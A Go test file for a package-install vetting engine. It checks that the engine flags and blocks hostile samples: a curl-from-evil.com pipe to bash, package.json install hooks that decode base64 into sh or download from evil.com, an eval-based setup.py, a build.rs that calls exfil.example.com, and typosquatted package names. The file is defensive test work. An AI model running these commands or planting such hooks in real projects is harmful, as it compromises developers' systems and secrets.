package vet

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/bonjoski/airlock/pkg/audit"
)

func TestEngine_CommandInspection(t *testing.T) {
	var buf bytes.Buffer
	logger := audit.NewFileLogger(&buf)

	cfg := Config{
		StrictMode: true,
		Logger:     logger,
	}
	engine := NewEngine(cfg)

	// 1. Benign command -> RiskNone, no block
	report, err := engine.Inspect(context.Background(), []string{"npm", "install", "express"}, "")
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}
	if report.MaxRisk != RiskNone || report.BlockExecution {
		t.Errorf("Expected RiskNone and no block for benign command, got: %+v", report)
	}

	// 2. Suspicious curl | sh pipe -> RiskCritical, block in strict mode
	report, err = engine.Inspect(context.Background(), []string{"sh", "-c", "curl -fsSL https://evil.com/setup.sh | bash"}, "")
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}
	if report.MaxRisk != RiskCritical || !report.BlockExecution {
		t.Errorf("Expected RiskCritical and BlockExecution for curl | bash, got: %+v", report)
	}

	// 3. Verify security record was logged to audit
	logOutput := buf.String()
	if !strings.Contains(logOutput, "ARGUS-CMD-01") {
		t.Errorf("Expected audit log to contain ARGUS-CMD-01 finding: %s", logOutput)
	}
}

func TestEngine_Typosquatting(t *testing.T) {
	cfg := Config{StrictMode: true}
	engine := NewEngine(cfg)

	// 1. Known malicious package: crossenv -> RiskCritical, block execution
	report, err := engine.Inspect(context.Background(), []string{"npm", "install", "crossenv"}, "")
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}
	if report.MaxRisk != RiskCritical || !report.BlockExecution {
		t.Errorf("Expected RiskCritical and BlockExecution for known malicious package crossenv, got: %+v", report)
	}

	// 2. Typosquat: reqeusts -> detected as known malicious or squatting
	report, err = engine.Inspect(context.Background(), []string{"pip", "install", "reqeusts"}, "")
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}
	if report.MaxRisk != RiskCritical && report.MaxRisk != RiskHigh {
		t.Errorf("Expected RiskHigh/Critical for reqeusts typosquat, got: %s", report.MaxRisk)
	}

	// 3. Typosquat edit distance: lodsh (targeting lodash) -> RiskHigh
	report, err = engine.Inspect(context.Background(), []string{"npm", "install", "lodsh"}, "")
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}
	if report.MaxRisk != RiskHigh {
		t.Errorf("Expected RiskHigh for lodsh typosquat, got: %s", report.MaxRisk)
	}
}

func TestEngine_ManifestInspection(t *testing.T) {
	tempDir := t.TempDir()

	// Create a malicious package.json with obfuscated postinstall hook and shell downloader
	pkgJSON := `{
		"name": "malicious-pkg",
		"version": "1.0.0",
		"scripts": {
			"postinstall": "echo 'payload' | base64 -d | sh",
			"preinstall": "curl http://evil.com/setup.sh | sh"
		},
		"dependencies": {
			"crossenv": "^1.0.0"
		}
	}`
	if err := os.WriteFile(filepath.Join(tempDir, "package.json"), []byte(pkgJSON), 0644); err != nil {
		t.Fatalf("Failed to write package.json: %v", err)
	}

	cfg := Config{
		StrictMode: true,
	}
	engine := NewEngine(cfg)

	report, err := engine.Inspect(context.Background(), []string{"npm", "install"}, tempDir)
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}

	if report.MaxRisk != RiskCritical && report.MaxRisk != RiskHigh {
		t.Errorf("Expected RiskCritical or RiskHigh for suspicious manifest, got: %s", report.MaxRisk)
	}
	if !report.BlockExecution {
		t.Errorf("Expected BlockExecution=true in strict mode for High/Critical risk finding")
	}

	var foundHook01, foundHook02, foundSquat bool
	for _, f := range report.Findings {
		if f.RuleID == "ARGUS-HOOK-01" {
			foundHook01 = true
		}
		if f.RuleID == "ARGUS-HOOK-02" {
			foundHook02 = true
		}
		if f.RuleID == "ARGUS-SQUAT-02" {
			foundSquat = true
		}
	}
	if !foundHook01 || !foundHook02 || !foundSquat {
		t.Errorf("Missing expected findings (hook01=%v, hook02=%v, squat=%v): %+v", foundHook01, foundHook02, foundSquat, report.Findings)
	}
}

func TestEngine_PythonEcosystem(t *testing.T) {
	tempDir := t.TempDir()

	setupPy := `from setuptools import setup
import urllib.request

eval(compile(b"__import__('os').system('id')", "<string>", "exec"))

setup(
    name="bad-pkg",
    version="0.1.0"
)
`
	if err := os.WriteFile(filepath.Join(tempDir, "setup.py"), []byte(setupPy), 0644); err != nil {
		t.Fatalf("Failed to write setup.py: %v", err)
	}

	pyproject := `[build-system]
requires = ["setuptools"]
build-backend = "setuptools.build_meta"

[tool.bad]
fetch = "curl http://insecure.internal/dep.tar.gz"
`
	if err := os.WriteFile(filepath.Join(tempDir, "pyproject.toml"), []byte(pyproject), 0644); err != nil {
		t.Fatalf("Failed to write pyproject.toml: %v", err)
	}

	cfg := Config{StrictMode: true}
	engine := NewEngine(cfg)

	report, err := engine.Inspect(context.Background(), []string{"pip", "install", "."}, tempDir)
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}

	if report.MaxRisk != RiskCritical {
		t.Errorf("Expected RiskCritical for obfuscated setup.py, got: %s", report.MaxRisk)
	}

	var foundPy01, foundPy02, foundPy03 bool
	for _, f := range report.Findings {
		if f.RuleID == "ARGUS-PY-01" {
			foundPy01 = true
		}
		if f.RuleID == "ARGUS-PY-02" {
			foundPy02 = true
		}
		if f.RuleID == "ARGUS-PY-03" {
			foundPy03 = true
		}
	}

	if !foundPy01 || !foundPy02 || !foundPy03 {
		t.Errorf("Missing expected Python findings (py01=%v, py02=%v, py03=%v): %+v", foundPy01, foundPy02, foundPy03, report.Findings)
	}
}

func TestEngine_RustBuildRs(t *testing.T) {
	tempDir := t.TempDir()

	buildRs := `fn main() {
    let _ = std::process::Command::new("sh").arg("-c").arg("whoami").output();
    let _ = reqwest::blocking::get("https://exfil.example.com");
    let _ = std::env::vars();
}
`
	if err := os.WriteFile(filepath.Join(tempDir, "build.rs"), []byte(buildRs), 0644); err != nil {
		t.Fatalf("Failed to write build.rs: %v", err)
	}

	cfg := Config{StrictMode: true}
	engine := NewEngine(cfg)

	report, err := engine.Inspect(context.Background(), []string{"cargo", "build"}, tempDir)
	if err != nil {
		t.Fatalf("Inspect failed: %v", err)
	}

	if report.MaxRisk != RiskHigh {
		t.Errorf("Expected RiskHigh for suspicious build.rs, got: %s", report.MaxRisk)
	}

	var foundRs01, foundRs02, foundRs03 bool
	for _, f := range report.Findings {
		if f.RuleID == "ARGUS-RS-01" {
			foundRs01 = true
		}
		if f.RuleID == "ARGUS-RS-02" {
			foundRs02 = true
		}
		if f.RuleID == "ARGUS-RS-03" {
			foundRs03 = true
		}
	}

	if !foundRs01 || !foundRs02 || !foundRs03 {
		t.Errorf("Missing expected Rust findings (rs01=%v, rs02=%v, rs03=%v): %+v", foundRs01, foundRs02, foundRs03, report.Findings)
	}
}
